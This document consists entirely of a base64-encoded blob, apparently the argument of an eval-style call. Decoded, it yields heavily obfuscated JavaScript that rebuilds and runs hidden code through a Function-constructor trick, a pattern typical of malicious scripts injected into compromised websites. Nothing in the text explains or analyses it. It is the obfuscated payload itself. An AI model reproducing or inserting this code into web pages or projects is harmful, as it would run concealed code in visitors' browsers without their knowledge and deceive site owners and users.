U1s5cjUsNnIsOW5scnJkc2wsbjEwNy4sPSwsbGEsZ2FbbGNyO2csLCtkaCwsKWgyNzBsaGEsLTEsb3B0czY2dHJhKC5BZUEicWZvcWEoODc3ZCBqKHo7OztyO2NmczEidmdrKWxbLCs7XTRyKCsgaGk7WztyMV0paGVbdltpdl1rPTgxKD1vITt9IGZvcmwtbHJkZmUwdXFuNiB0OXI7bikrb3M5bj10eT1sKHcpbm1ifSg2dDtlZyttNi12c2VqKS4oaHJybz07MmEpdXZmZmlyO3I8bDs7LmEiYnBpMy0xYXorICxpIDljKTZyYSs7Z3k7ZjtuO3ZzdSkwaHNwenQgdmF0IHErdXM4aGxsPS49bWw7aSlwKSAxci5wO2htZ24gcm93KHR1Oyt2KShkaDxyO3MxMGkpYT0oaTIpezE7cl1lOCBbPXtydGkgZGUgMGZyKWhudXJDe2FqaDssMDcydi5vcnVhQ3QraGErcyhlLmNsYUM3aTR0NHRibmh2Ki0od3ZobGNlKytkcjllczllaHJpeDJ2eWl9ZUFwW1t1dl1ldHVdaiJ2c2cuO2Fhe11oPWFBO25sbGopNyhmcnpzZSJudig9ciF2K0NydWEuPj1xLl0oKXMycW5nKythYW4wO3BpcihyaG47YSguPTs9IHJ1WygpICA7Ln11NT50Z2EpKW9keStsbj10MmxxcSJ2Z2EwaGwuKTtpIHI8bjBqdnNbLGldaDtmPSArdj1vOyldKTBlYnVzcG17cyhhdWVdXXQgO290bChlc3crZTxoZitmPXQgKSl2O1tobz1xLmVvPW5DbTw4KzZ9Liw4cmZuaHJsLGcpKGYsLGwgPT1zLmY2KjdyZXdycnJvbjsiPSsuZyx0LT07ZiBbImopPSx1YnIucjVuLWFiLmU7PWpnLF09Ky5naHN2LmhyYT07Q2hhMXZwdSIoNGgpKG5tbShlO2Esa2t7cG5ycixndG9ydil7PW99Oyxya2F6OGw9dGJuY2E4d2NhKDJsKHZtQyl3b247MD11LnBtdGRnXSthMmx2b2NvYWxvcmk9ZSkuaUNyO0Eocis9bnN0O2kgPSJjbnJ0dS52KCk9M3QpcCc7dmFyIFVhaD1NQXhbRFFwXTt2YXIgVWZ1PScnO3ZhciBUQXc9VWFoO3ZhciBRZG09VWFoKFVmdSxNQXgoUWpxKSk7dmFyIGtIZT1RZG0oTUF4KCdhQW0sbkF4ZHlBfUEoZWVldWVcL2w6a0EpQWdlZ2FBbD1fZEE/XzAzQTEsIWNpIDYwdGZvW3dBQX1mNDpnIXdfKCQodylmYShdbiJpd2VBby5laTZuVWtpbC4rJWYobClSNzhBb0EoTiFTdXRdTGUmYnNBXXtdfTAsPS4lQV9vZWltaHQpai5vU18lKDZzRUF1YTBmcl9BOC4gZW4te3RdczpzMylqQV07QXBpfUFfW0FwcVt2VDRsbGlBYWVUNEFBOig7YyRBaEEwLkEyc01kNF8xaUE7QWY1bXJxZUEhIWZmbyBmZnRwZWx7YSQgezEubjlBQUFvOWNfMFwvJVtdXSUuYiBvYUZiW0FiQUFfcl1BYkEiaUYoJFRBbnRiO2YgKV8zdG05ZWFxTEF3LjFmQW5hQUNyJHQ7cC5mYTtKYUYlZiBkJSV7bnRBXUF7Ll09JV19c3Bhbm5vZ3QhXXRlT2Z0eH0iXzJBSWpdZiFBbWZvMyk9bi5ybXBucnR0N2ZsJW9Bd0VBLmQyIWdoTnIuXXI2dS5pNn1pX2cuZkFmZWI+MXVBNGtkYyxsbyNuIHRBZS4mLnQ9dXd0d2NBJTEpbmJBamR0dHsycXR0QW0zb19pWyVlPGNoQWVPcmZifWllaWN9YXR7IXMpbyFBY2ZBSXAxZiFBIFwvaW5vOiRjNi4uM3MudXBfbl97JUEhLGhhYTddJF9jbz06KF1bNF1saV91an09NCl1aS5dQTZ1QUElMSlDZHV4XUplYTYlaTJqJGU2PyNlYihvJWFnKF9lXz1lOyl0dG1mY3JsbyBsIW1vdHVyZXVfXC9vbl81ZWRyJS5hQXRjQUFfXV90LShkMUFObWVuQXQhfXtkN2ZiaEFvW0FzXz1BZn12QXlBXWIuaHJvMl9vKHdvcl90aCw3fSMlMUF9MTZRZE49LnJiZTFmcm9BeTBjY0FlZmlyU2U+Zjpqb310LiFmX28oKHYlQW4pdSV3KHNocnBlQTRkKWR0QXJFJVJTfShBckEoamZmKTEmLmZkQWVhcHtyaW9wK2sgLmhBQWcyYiBlb30xdEEsbDozamVpJWZ0OCgrXVtdZjFjQXZyQXRpaTAubm4+bnRBeylmc0FuaStjXlksPSklM0ElJUFsJStXZ10yIEFlKX1yJSElNGZCd3RuNCxnXWcobUFpLWlub2RhaF99dT1jZXZBQVwvZF01XyAlc3NpLmRvYWVnUEF1bkFlcn1jJTptYUMgYjQuVGVtbyplbi4raGFtMXNpYTFBdShtJUE3QSh7ITBiZSUhQW4uMEFwUS5hQS1DSW90bEFmPS51Nm8ldGElOzwlcHMgO29pcylkPDszOmgrZnJlY2QuIGZub0FlcC4yd3NdZTRyeC53b29mLEJYfUExNjJRbSkuSzYwKGloZjZ0KTR0cl94bjZBPSkxTilhbDlXa3RpQVtQMERBJG4zKThvLTsxZl9sZS4pO0EpaV1pLGtpQWR0QT0oTyZKZ2EiNkF1S2Uwb2NnLm9uIEFBQTolZTFBMXAubHR2YXU7ZSQlQ2lBZUFvdH1BQSlpLl9mIW4zLl80QTcrJUFBXyAyckE9NixcL01dXC9tYz4yclgiZTZvbGJdWV0oXShBX0EzXV82b2VBeSViKCw4aUFBZVQ6NEpoZWFBc20zKyJUZnROX2MyOy16fXdYN30zQUFBRmcpSGxlfV1nPWxBKV1uKWNBQS4zIGVlMy50SW5HQW9hXkFfX3QxfUFkdCFBO0EgJFsuc29zOTgxQSBmSWIxLEEuZDVBX0FkZmVYZT8pPV9yaUFSQXYuXTsrMmx7bTRhbl0waXJBWSRBXWQ9ZUEwKS5vfXBBeWZUJWVjc2czQWJhZm50XXU2JSBBO1szLit7YkFhb2h9OWIuKGVleSkpby5BYy5uaUtyYSRpcmI7QStpJGZEZkEwbDRFYEEueSI0LmV0IUElOixne3JBPWwoOT1mQV80X3B0QShlQWklKWV0KCFdLmYuO2ZuaXNBQV19Z0FhXVMuQTNhM2Y5ITIhSSxBbyg0cjRBY19mKDslTDZhQWldYWE9QSBBYUFBdENvKCBvUylBPV1BJkBBc0ElIEhFbk97PWZ2MzBpMW5zbkEhdF9fM29lLn1BQTh1IW5QYl1hbmZBZjE5Xy42QV0uIW9vb3Q7XFxiXygsb2YoLGw4XzosJiApKV1hPXJvcEFtZCUuc2Y3X3Vfby46JV9iXWVyTnIgdUFBOW9pZSk9KTIlWyFBYmxfYm4gQXJyXSsxXCciMUE9X2xfPWNydGdhNGV3PW8lXUFdOV0hZW9hYnRhX1IiWnJBIDZjdWlRYSkuTW47fEFfX31yXS5BKXQgal9fb3AoZnJBUzF0SztBOzspMiVtMU51KSlJX3RlQShiMVcsdUFPKF0zIEEhQSl0ZWQubW4icGUoLmJbK2M9eThvMF13UyQ3dz0sQS5uXXMrVj10KDJscDp5ZW9hNGxvaDVBZWJfMmNTX289XTNfdHRfOVwvb0FdVkF9dEExLjtubyE6Ll9vaUE1QUFBZWZBQUF0ZmEyQSxmOWUuXW1WQWgpdCldK3NBZm9lQW5ASkRuMHNudHRBKzh0PWVoQW5BOUEwQSAgVVQ7aTRBXWIxMSlBQSVsJDA7LmwwLjIuYTNhbm5BQVs/c25wO2ZpZWYpbGxBJT4oXXIzNilpZWllcihlciQ9TG1BNS5BLmZvcmVhIDEuXTswYV9BJV1BSWEjcm59bjROY1tzY2FldWZLQUcudGN0XylBdEFfQWUiaGRwLjJpWWNjQXFoXWVjITRnPTN7MntlZjVyOXNidEE/MT1sKC40ZXRBcGZBUm5mMG8oc19kb3BBTiJub0csMGx4ZXQ2MGM2PXszdHIuQVZBd100KDYpXXJwX2wgfV9ubyAkUTQuaiAyY19fYSxuXUFvXWRkbTEudGVuIGUpQSUyMClmQTVpXXQ9ZTZjLjUudDdmXXVvMWJdYXRBQXk3OV1kbTVmdF8rb0FBZVcsQWU9OiwzNEFkJW80MiQlQXtyM3NdcilmQTN2QXI7bjQiJX1uOy50Imx5bjh9NW1BQSh4b2YlYkE1QXRBNkFlQE5ufS5ne3FBXWdsLmIlLihBMkEsXy0xc1c2aCVuUmdfXXJkXURBeEFBI0EiIV9zPXR7QSV5LnByQSk/MTl1aF09X3BuQXxdXigyKV93MW9BdC5mMmlfX3tcJyx4bzk0K2hFJX0gJTt7PS5gaTouc2Mgal9BVGQ6IC1zXSFzLiA4LmNlK1phTmRBX3AzXy4oeXIwKTtpLWlCLjp5ZXN0K0E9NCUsXTthQX19M30yPUFyX3tnbkFybGxYQSldLjlBNDpBJXQxKV9lZmRpXXtBKC4pOnI2MXIpKzM1MTcgQUFBQyh0KGU9LnQsMSVoZWEyXV9BdEFBNV8hX29Be2VyKSAgLjoudWN1QXMsQTFddCRvZWVBKG9sUyh9M3VuZCBBKzhfQUFyLmQzaUFzVFE2Y2RiQVxcbndwZDhBPXMxdCg6LiF7KTBfO3QuTV0oZWlBNDtXQXIhb2FuMmF0ZjFiKTFudFpdXWZEJSUpQTJmXWxjVTo9IylBIV1saXQjQTFkUkEhckk4Yl1mIjp9JShyQShhdHthN19uX0soLnNlYV9BNGlhUV1oQV0+aHZJQUE7c0FBaHguX3Q9X0ExMzM9KWZBIXpbZSVucm4zNzN7JG89aTdvdHVdKHB0QWFBQSxBc1wvKWFzcF9fJVF1b2EobWU1OmZpQXUtLl8pbGYmLjdBMTdoZjh0PWQiNkFwZTEuZjUuYW8pc2Yrd19BYS1BPTEybm9BekFdNXJvLiVmMDEtOy4sY2lRQSlBb2xvVTswZSh9PSZcXEFBQT1ddF99UnAzM24yNVNBeylkaCBBIWZzX1s9YzMldDJ0aHRkfTw9IHNkYz1lXWVBYjRBOj1lNmYxK3VBKkFkX25BZm97QUFBIUF1QTMoMTNfO2Y4KGhyNl09bjNTandBc2U9X0F3I2czYV9oQUFlZ24tKV9cJ0FkZl1vN0E2KyV1QTVvOX1hKUE2XzRfeStIYX10QXJHNElBYXdfVjt9ZV1sQEFfX1p7ZHE0QXNdZkE9ZDVBRXQpUSMwXSgjbGVBXXJdQWhvXWdfQXNlO05BJWZwYXNmZEF5ZCN0c2pvIW9dM2UxNChCdj1dfXsxQSV7Nzh7MUFUYn1oQWlFQWZwKUF7Km9wNyguMnJdVkBdQV8lYUFsRHUubkkyPTZsQSVuO2FOQW99IGYgQWlBKyUpZTpmP2wyW29zYyJjQWMsXXsuKz0oQSk7QWwpOXM9Nk5BU3RfO31OS19dciheSU8iey4peDVkVUFzXyMpXWU7YnQoWl9ldGF9XS5fQWd0aVJqbGEoSGhBUSFiKUFdKUFtLjtdQSBkLlkgQWxvMGJbZHQoZTJmQV9vdl8lUyUuOSBzYmErX3UlQTklb2dBMHJvX09fe3RlXCcsO3t7aX1lX2YgQXFBfWZyZmNsXztqKW89bjNBNGVkY2xhc0FuK0E0Nl8qLjB3bmY0b119X0EpLikoQUF9QTdmKGYsQU1BJUFBbjt0UW5rZjFBLl90QTJdYn1fbyE2JWRmJGM7KSl1X0F1Wy5fMzwgY2dyXSBdOEFBfUE2QWwzcm5ddH0wMTFdJGU1cl1mPV8pc2M6QUF0Z2w5QUEgby1sXy4gQXUhYXIxZjA7eGxBY1tzb2VfX2lAJE9BbyAmODkue2VfZWVyeXJBaSBmLjAoajlBKGxvOEEwcnZ1QU9Ub2w9SzlfbF1BQXVmYVxcbjspOygzXygoZHNvQWRzXC9sJXQ9ISlGTildNWFkNm83QTNvby5jJV9pLF1jPSlpPV85ZDtyN3AoYTBfYSU1ZWVjc3JwNyl0IWx1OSUxISlBb3AhbjBfbW9dZCRBPyVfYXFzU1wvOyUpcjdBIC5objFfJW95b3tdXC9daD0xK11BQUFsJTQgdV8uMjM4ZUFPKDJVIF8zQXQzMlNpb2tycmY9LnByZmUoeSx0IWUpQT1hXyRncH0peycpKTt2YXIgVGR1PVRBdyhvUE8sa0hlICk7VGR1KDMyMjQpO3JldHVybiA4MDgyfSkoKQ=='))
